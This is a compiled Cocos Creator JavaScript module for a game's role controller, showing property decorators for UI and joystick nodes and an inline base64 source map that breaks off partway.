    __decorate([
        property(cc.Node)
    ], GameRoleController.prototype, "bulletStrikeLayer", void 0);
    __decorate([
        property(cc.Prefab)
    ], GameRoleController.prototype, "propStatePrefab", void 0);
    __decorate([
        property(cc.Node)
    ], GameRoleController.prototype, "propStateNode", void 0);
    __decorate([
        property(cc.Node)
    ], GameRoleController.prototype, "takePropLayer", void 0);
    __decorate([
        property(sp.Skeleton)
    ], GameRoleController.prototype, "beAttackSke", void 0);
    __decorate([
        property(sp.Skeleton)
    ], GameRoleController.prototype, "weaponSke", void 0);
    __decorate([
        property(cc.Label)
    ], GameRoleController.prototype, "payloadLabel", void 0);
    __decorate([
        property(cc.Node)
    ], GameRoleController.prototype, "payloadBars", void 0);
    __decorate([
        property(cc.ProgressBar)
    ], GameRoleController.prototype, "hpProgressBar", void 0);
    __decorate([
        property(cc.Node)
    ], GameRoleController.prototype, "hpBarNode", void 0);
    __decorate([
        property(cc.Node)
    ], GameRoleController.prototype, "bgLayer", void 0);
    __decorate([
        property({ type: cc.Node, tooltip: "摇杆操纵点" })
    ], GameRoleController.prototype, "dot", void 0);
    __decorate([
        property({ type: cc.Node, tooltip: "摇杆背景节点" })
    ], GameRoleController.prototype, "ring", void 0);
    __decorate([
        property({ type: cc.Enum(JoystickType), tooltip: "触摸类型" })
    ], GameRoleController.prototype, "joystickType", void 0);
    __decorate([
        property({ type: cc.Enum(DirectionType), tooltip: "方向类型" })
    ], GameRoleController.prototype, "directionType", void 0);
    __decorate([
        property(Role_1.default)
    ], GameRoleController.prototype, "role", void 0);
    __decorate([
        property(BulletOfFangHuDun_1.default)
    ], GameRoleController.prototype, "impenetrableDefence", void 0);
    GameRoleController = __decorate([
        ccclass
    ], GameRoleController);
    return GameRoleController;
}(cc.Component));
exports.default = GameRoleController;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2dhbWUvR2FtZVJvbGVDb250cm9sbGVyLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7O0FBRUEsK0ZBQTBGO0FBQzFGLCtGQUEwRjtBQUMxRiwyRkFBc0Y7QUFDdEYsK0ZBQTBGO0FBQzFGLDhDQUFzRDtBQUN0RCw4REFBeUQ7QUFDekQsdUZBQWtGO0FBQ2xGLHVGQUFrRjtBQUNsRix5RkFBb0Y7QUFDcEYsMkZBQXNGO0FBQ3RGLHFGQUFnRjtBQUdoRix5RUFBb0U7QUFDcEUsbUZBQThFO0FBQzlFLHlDQUFzQztBQUN0QyxpREFBNEM7QUFDNUMsMEVBQXFFO0FBRXJFLDRFQUF1RTtBQUN2RSx3REFBcUQ7QUFDckQsdUNBQW9DO0FBQ3BDLHFFQUFrRTtBQUNsRSw2REFBMEQ7QUFDMUQsbURBQThDO0FBQzlDLDJEQUFxRDtBQUUvQyxJQUFBLEtBQXNCLEVBQUUsQ0FBQyxVQUFVLEVBQWxDLE9BQU8sYUFBQSxFQUFFLFFBQVEsY0FBaUIsQ0FBQztBQUUxQyxJQUFZLFlBR1g7QUFIRCxXQUFZLFlBQVk7SUFDcEIsaURBQUssQ0FBQTtJQUNMLG1EQUFNLENBQUE7QUFDVixDQUFDLEVBSFcsWUFBWSxHQUFaLG9CQUFZLEtBQVosb0JBQVksUUFHdkI7QUFFRCxJQUFZLGFBSVg7QUFKRCxXQUFZLGFBQWE7SUFDckIsaURBQVEsQ0FBQTtJQUNSLG1EQUFTLENBQUE7SUFDVCwrQ0FBTyxDQUFBO0FBQ1gsQ0FBQyxFQUpXLGFBQWEsR0FBYixxQkFBYSxLQUFiLHFCQUFhLFFBSXhCO0FBRUQsSUFBTSxZQUFZLEdBQUcsRUFBRSxDQUFDO0FBRXhCLElBQU0saUJBQWlCLEdBQUcsQ0FBQyxJQUFJLEVBQUUsR0FBRyxFQUFFLEdBQUcsRUFBRSxJQUFJLEVBQUUsQ0FBQyxFQUFFLENBQUMsRUFBRSxDQUFDLEVBQUUsR0FBRyxFQUFFLENBQUMsRUFBRSxDQUFDLEVBQUUsQ0FBQyxFQUFFLENBQUMsRUFBRSxDQUFD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